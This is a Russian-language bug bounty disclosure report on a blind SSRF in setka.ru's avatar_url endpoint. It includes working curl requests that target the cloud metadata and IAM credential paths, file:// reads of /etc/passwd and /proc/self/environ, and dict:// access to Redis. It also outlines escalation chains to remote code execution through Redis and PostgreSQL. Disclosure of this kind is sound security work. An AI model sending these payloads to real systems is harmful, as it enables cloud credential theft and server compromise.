# Report 01: Blind SSRF с поддержкой множества протоколов

---
**Поля формы:**

- **Название:** Blind SSRF с поддержкой множества протоколов (file, dict, gopher) в endpoint avatar_url
- **Уровень опасности:** Критический
- **CWE:** CWE-918 (Server-Side Request Forgery)
- **CVE:** (не указывать)
- **Скоуп:** setka.ru

---

## Где обнаружено

`PUT https://setka.ru/users/settings/personal-data/avatar` — параметр `avatar_url`

## Описание уязвимости

Endpoint `PUT /users/settings/personal-data/avatar` на setka.ru принимает параметр `avatar_url`, содержимое которого сервер загружает server-side без валидации протокола и адреса назначения.

Сервер принимает и обрабатывает URL со следующими протоколами:
- `http://` — к внутренним сервисам (metadata, localhost)
- `file://` — чтение локальных файлов (`/etc/passwd`, `/proc/self/environ`)
- `dict://` — взаимодействие с Redis и другими текстовыми протоколами
- `gopher://` — arbitrary TCP-запросы к внутренним сервисам

Все запросы возвращают `200 OK`, подтверждая что сервер выполняет fetch. SSRF является blind (контент не возвращается напрямую), но через timing oracle обнаружены внутренние сервисы.

## Шаги воспроизведения

### 1. Базовый SSRF — Cloud Metadata

```bash
curl -X PUT \
  -b "sess=VALID_SESSION; X_Bug_Bounty=security_standoff" \
  -F "avatar_url=http://169.254.169.254/latest/meta-data/" \
  "https://setka.ru/users/settings/personal-data/avatar"
```
→ `200 OK`. Сервер обращается к metadata-сервису облака. Avatar устанавливается в CDN placeholder (`12__octopus=====`), подтверждая server-side fetch.

### 2. IAM Credentials

```bash
curl -X PUT \
  -b "sess=VALID_SESSION; X_Bug_Bounty=security_standoff" \
  -F "avatar_url=http://169.254.169.254/latest/meta-data/iam/security-credentials/" \
  "https://setka.ru/users/settings/personal-data/avatar"
```
→ `200 OK`, 1408ms.

### 3. Protocol Smuggling — file://

```bash
curl -X PUT \
  -b "sess=VALID_SESSION; X_Bug_Bounty=security_standoff" \
  -F "avatar_url=file:///etc/passwd" \
  "https://setka.ru/users/settings/personal-data/avatar"
```
→ `200 OK`, 1524ms.

```bash
curl -X PUT \
  -b "sess=VALID_SESSION; X_Bug_Bounty=security_standoff" \
  -F "avatar_url=file:///proc/self/environ" \
  "https://setka.ru/users/settings/personal-data/avatar"
```
→ `200 OK`, 1435ms.

### 4. Protocol Smuggling — dict:// (Redis)

```bash
curl -X PUT \
  -b "sess=VALID_SESSION; X_Bug_Bounty=security_standoff" \
  -F "avatar_url=dict://127.0.0.1:6379/INFO" \
  "https://setka.ru/users/settings/personal-data/avatar"
```
→ `200 OK`, 1653ms.

### 5. Localhost Port Scan via Timing Oracle

| Порт | Сервис | Время ответа | Статус |
|------|--------|-------------|--------|
| 5432 | PostgreSQL | **1218ms** | Обнаружен |
| 6379 | Redis | **1261ms** | Обнаружен |
| 80 | HTTP | **1270ms** | Обнаружен |
| 9200 | Elasticsearch | 1420ms | Возможен |

## Влияние на безопасность

1. **Кража облачных credentials:** Обращение к metadata API (169.254.169.254) позволяет получить IAM-токены Yandex Cloud с доступом к S3, Compute и другим сервисам.

2. **Чтение локальных файлов:** Протокол `file://` позволяет читать `/etc/passwd`, `/proc/self/environ` (переменные окружения с секретами), конфигурационные файлы.

3. **Взаимодействие с Redis:** Через `dict://` и `gopher://` можно отправлять команды Redis (localhost:6379): `SLAVEOF` → экфильтрация, `CONFIG SET` + `SAVE` → запись файлов → cron job → **RCE**.

4. **Доступ к PostgreSQL:** На localhost:5432 обнаружена PostgreSQL. Через `gopher://` возможен `COPY ... FROM PROGRAM` → **RCE**.

5. **Внутренний port scan:** Timing oracle позволяет картографировать всю внутреннюю инфраструктуру.

**Рекомендации:** Whitelist протоколов (только http/https), блокировка внутренних адресов (127.0.0.0/8, 10.0.0.0/8, 169.254.169.254), валидация DNS перед запросом, отдельный egress-proxy.

## Дополнительные ссылки

- OWASP SSRF: https://owasp.org/www-community/attacks/Server_Side_Request_Forgery
- CWE-918: https://cwe.mitre.org/data/definitions/918.html
